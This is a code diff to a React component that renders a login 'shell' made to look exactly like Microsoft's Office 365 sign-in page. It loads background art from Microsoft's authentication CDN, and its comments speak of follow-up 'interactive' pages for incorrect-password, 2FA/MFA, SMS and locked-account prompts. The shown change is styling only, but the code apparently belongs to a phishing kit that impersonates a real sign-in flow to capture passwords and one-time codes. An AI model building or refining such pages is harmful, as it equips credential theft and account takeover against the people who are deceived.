@@ -103,18 +103,31 @@ const ProviderShell: React.FC<ProviderShellProps> = ({
 
   // ─────────────────────────────────────── Office 365 (Microsoft chrome)
   if (providerKey === 'office365') {
+    // Use the EXACT same background asset/styling as `Office365Wrapper`
+    // (`/public/office.365.html`) so the login page and every subsequent
+    // interactive page (incorrect password, 2FA/MFA, SMS, locked, …) share
+    // a single consistent Microsoft visual identity. Mobile collapses to a
+    // plain white background, mirroring the iframe's `@media (max-width:600px)`
+    // rule.
     return (
       <div
-        className="min-h-screen flex items-center justify-center p-0 md:p-4"
+        className="o365-shell min-h-screen flex items-center justify-center p-0 md:p-4"
         style={{
           fontFamily: theme.fontFamily,
           backgroundImage:
-            "url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')",
+            "url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')",
           backgroundSize: 'cover',
-          backgroundPosition: 'center',
-          backgroundColor: '#e9e9e9',
+          backgroundRepeat: 'no-repeat',
+          backgroundAttachment: 'fixed',
+          backgroundPosition: 'center center',
+          backgroundColor: '#fff',
         }}
       >
+        <style>{`
+          @media (max-width: 600px) {
+            .o365-shell { background-image: none !important; background-color: #fff !important; }
+          }
+        `}</style>
         <div className="bg-white w-full max-w-[440px] px-11 py-11" style={{ boxShadow: '0 2px 6px rgba(0,0,0,.2)' }}>
           <div className="mb-5">
             <ProviderLogo providerKey="office365" />
